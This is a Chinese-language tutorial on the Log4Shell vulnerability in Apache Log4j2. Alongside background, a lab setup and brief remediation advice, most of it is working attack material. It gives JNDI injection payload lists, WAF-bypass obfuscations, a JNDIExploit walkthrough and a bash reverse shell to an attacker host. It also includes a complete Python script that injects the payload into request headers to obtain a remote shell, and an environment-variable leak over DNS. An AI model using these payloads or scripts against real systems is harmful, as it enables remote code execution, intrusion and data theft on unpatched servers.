# CVE-2021-44228 Log4Shell 漏洞分析与 EXP 实战

---

## 📋 目录

1. [漏洞概述](#一漏洞概述)
2. [漏洞原理](#二漏洞原理)
3. [影响范围判断](#三影响范围)
4. [漏洞复现](#四漏洞复现)
5. [完整 EXP 开发](#五exp开发)
6. [绕过与高级利用](#六绕过与高级利用)
7. [漏洞检测](#七漏洞检测)
8. [修复方案](#八修复方案)

---

## 一、漏洞概述

```
CVE-2021-44228 (CVSS 10.0) — 2021年12月9日公开

漏洞名称: Log4Shell
影响组件: Apache Log4j2 2.0-beta9 ~ 2.14.1 (2.15.0-rc1 可绕过)
漏洞类型: JNDI 注入 → 远程代码执行(RCE)

影响范围: 
  ✦ 全球约93%的云环境受影响
  ✦ 几乎所有使用Java的企业应用
  ✦ Minecraft服务器最著名的受害者

利用条件:
  ✓ 使用了受影响版本的Log4j2
  ✓ 攻击者能控制日志输入(如User-Agent/URL参数/用户名)
  ✓ 目标能出网(LDAP/RMI回连)
```

---

## 二、漏洞原理

### 2.1 Log4j2 消息查找机制

```
Log4j2 的 Message Lookup 功能:
  ${prefix:name} → 在运行时动态替换为对应值

常见Lookup:
  ${env:JAVA_HOME}      → 读取环境变量
  ${sys:os.name}         → 读取系统属性  
  ${java:version}        → 读取Java版本
  ${lower:${upper:TEST}} → 大小写转换
  ${jndi:ldap://xxx}     → JNDI查询(危险!)

攻击链路:
  用户输入 → Log4j2记录 → 解析${jndi:ldap://attacker.com/evil}
  → JNDI 查询LDAP服务器 → 加载远程Java类 → 执行恶意代码!
```

### 2.2 漏洞触发流程

```
Step 1: 攻击者发送含JNDI注入的请求
  curl -H 'User-Agent: ${jndi:ldap://attacker.com/Exploit}' https://target.com

Step 2: Log4j2 记录UA
  logger.info("User-Agent: {}", userAgent);
  → 解析 ${jndi:ldap://attacker.com/Exploit}

Step 3: JNDI 查询LDAP
  → 连接 attacker.com:389(LDAP) 或 1389/1099(RMI)

Step 4: LDAP返回恶意Java类引用
  → 目标从 attacker.com 下载 Exploit.class

Step 5: 执行恶意代码
  → Runtime.getRuntime().exec("反弹shell命令")
```

---

## 三、影响范围

### 3.1 根本原因：出网

```
受影响应用（只要用了Log4j2 + 可出网）：

Web 服务器:
  Apache Tomcat, Jetty, WebLogic, WebSphere, JBoss
  
框架:
  Spring Boot, Apache Struts2, Apache Druid
  Apache Solr, Elasticsearch, Apache Flink
  
应用:
  Minecraft Server/Client, Jenkins
  Jira, Confluence, Bitbucket
  
云服务:
  AWS, Azure, GCP 的部分服务
  Apple iCloud(Bug Bounty相关)
```

### 3.2 探测 Payload 集合

```bash
# === 基础探测 ===
${jndi:ldap://your-server.com/test}                    # 标准LDAP
${jndi:ldap://your-server.com:1389/test}               # 指定端口
${jndi:dns://your-server.com/test}                     # DNS探测
${jndi:rmi://your-server.com:1099/test}                # RMI

# === 绕过基础过滤 ===
${${lower:j}ndi:ldap://your-server.com/test}           # lower绕过
${${::-j}${::-n}${::-d}${::-i}:ldap://your-server.com} # ::- 分隔绕过
${${upper:jndi}:ldap://your-server.com/test}            # upper绕过
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://...}# env绕过

# === DNS 探测(推荐先用于检测) ===
${jndi:dns://${env:USER}.your-dns-server.com}
# → DNS查询中包含环境变量USER的值
# → 无需RCE即可确认漏洞存在
```

---

## 四、漏洞复现

### 4.1 Docker 环境搭建

```bash
# 搭建脆弱环境
git clone https://github.com/christophetd/log4shell-vulnerable-app
cd log4shell-vulnerable-app
docker-compose up -d
# → http://localhost:8080

# 测试:
curl 'http://localhost:8080/' -H 'X-Api-Version: ${jndi:ldap://attacker.com/test}'
```

### 4.2 JNDI Exploit 工具

```bash
# JNDIExploit — 最流行的 Log4Shell 利用工具
git clone https://github.com/zzwlpx/JNDIExploit
cd JNDIExploit
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i attacker.com -p 1389

# 启动后监听:
# LDAP: attacker.com:1389
# HTTP: attacker.com:8080 (用于下载恶意类)

# 支持的利用方式:
# /Basic/Command/Base64/<base64_command>
# /Basic/ReverseShell/<ip>/<port>
# /TomcatBypass/Command/Base64/<command>
```

### 4.3 获取 Shell

```bash
# Step 1: 启动 JNDI 服务器
java -jar JNDIExploit.jar -i attacker.com -p 1389

# Step 2: 监听反弹Shell
nc -lvnp 4444

# Step 3: 构造反弹Shell命令
echo "bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" | base64
# → YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYxJw==

# Step 4: 发送攻击请求
curl 'https://target.com/login' \
  -H "User-Agent: \${jndi:ldap://attacker.com:1389/Basic/ReverseShell/attacker.com/4444}"

# Step 5: 接收Shell
# nc 接收到连接 → id → uid=1000(tomcat)
```

---

## 五、EXP 开发

### 5.1 Python 检测脚本

```python
#!/usr/bin/env python3
"""Log4Shell 批量检测脚本"""
import requests
import sys
import dns.resolver
from concurrent.futures import ThreadPoolExecutor

CALLBACK_SERVER = "your-callback.example.com"  # DNS 回调服务器

def check_log4shell(url):
    """检测目标是否存在 Log4Shell"""
    # 生成唯一标识(用于关联DNS回调查询)
    import uuid
    token = uuid.uuid4().hex[:8]
    callback = f"{token}.{CALLBACK_SERVER}"
    
    # JNDI DNS payload
    payload = f"${{jndi:dns://{callback}}}"
    
    # 注入到各种位置
    headers = {
        "User-Agent": payload,
        "X-Forwarded-For": payload,
        "X-Real-IP": payload,
        "Referer": payload,
        "Cookie": f"test={payload}",
    }
    
    # 尝试访问
    try:
        requests.get(url, headers=headers, timeout=5, verify=False)
    except:
        pass
    
    # 检查DNS回调
    try:
        answers = dns.resolver.resolve(callback, 'A')
        if answers:
            print(f"[+] VULNERABLE: {url} (Token: {token})")
            return True
    except:
        pass
    
    print(f"[-] Not vulnerable: {url}")
    return False

# 使用
check_log4shell("https://example.com")
```

### 5.2 完整利用脚本

```python
#!/usr/bin/env python3
"""Log4Shell 完整利用脚本"""
import requests
import base64
import argparse

def exploit(url, lhost, lport, jndi_port=1389):
    """利用 Log4Shell 反弹Shell"""
    
    # 反弹Shell命令
    cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
    cmd_b64 = base64.b64encode(cmd.encode()).decode()
    
    # JNDI 请求(使用JNDIExploit)
    jndi_url = f"ldap://{lhost}:{jndi_port}/Basic/ReverseShell/{lhost}/{lport}"
    payload = f"${{jndi:{jndi_url}}}"
    
    print(f"[*] Payload: {payload}")
    print(f"[*] Sending exploit to {url}")
    
    headers = {
        "User-Agent": payload,
        "X-Api-Version": payload,
        "X-Forwarded-For": payload,
        "Cookie": f"session={payload}",
    }
    
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        print(f"[+] Request sent (Status: {resp.status_code})")
        print(f"[*] Check your listener (nc -lvnp {lport})")
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", required=True)
    parser.add_argument("-l", "--lhost", required=True)
    parser.add_argument("-p", "--lport", type=int, required=True)
    args = parser.parse_args()
    exploit(args.url, args.lhost, args.lport)
```

---

## 六、绕过与高级利用

### 6.1 绕过常见WAF

```bash
# WAF 检测 ${jndi:ldap:// 关键字

# 1. lower/upper 绕过
${${lower:j}ndi:ldap://attacker.com/test}
${${upper:jndi}:ldap://attacker.com/test}

# 2. 空变量分隔
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com}

# 3. env 绕过
${${env:NaN:-jndi}:ldap://attacker.com}

# 4. sys 绕过  
${${sys:user.name}:-j}ndi:ldap://attacker.com
# sys:user.name 通常为空 → 取默认值 'j'

# 5. date 绕过
${${date:yyyy}:-j}ndi:ldap://attacker.com
```

### 6.2 不出网利用

```bash
# 如果目标不能直接出网(DNS/LDAP被防火墙拦截)

# 1. 使用目标本地资源
${jndi:ldap://127.0.0.1:1389/test}

# 2. 通过已控制的内部服务器转发
${jndi:ldap://10.0.1.100:1389/test}

# 3. CORBA/IIOP 协议(如果开放)
${jndi:corbaname::attacker.com#test}
```

---

## 七、漏洞检测

```bash
# === Nuclei 扫描 ===
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# === log4j-scan ===
git clone https://github.com/fullhunt/log4j-scan
python3 log4j-scan.py -u https://target.com

# === 手动DNS检测(最准确) ===
# 发送: ${jndi:dns://random-token.your-dns-server.com}
# 查看DNS服务器日志是否收到查询
```

---

## 八、修复方案

```bash
# 1. 升级 Log4j2 (推荐)
# 升级到 2.17.1+

# 2. 临时缓解 (如无法立即升级)
# JVM参数:
-Dlog4j2.formatMsgNoLookups=true

# 环境变量:
export LOG4J_FORMAT_MSG_NO_LOOKUPS=true

# 3. 删除 JndiLookup 类
zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class

# 4. WAF 规则
# 拦截包含 ${jndi: 或 ${${ 的请求
```

---

## ✅ Checklist

- [ ] 确认 Log4j2 版本(2.0-2.14.1)
- [ ] DNS 回调检测漏洞
- [ ] JNDIExploit 搭建利用环境
- [ ] 反弹Shell获取
- [ ] 绕过测试(lower/upper/env)
- [ ] 升级/修复加固
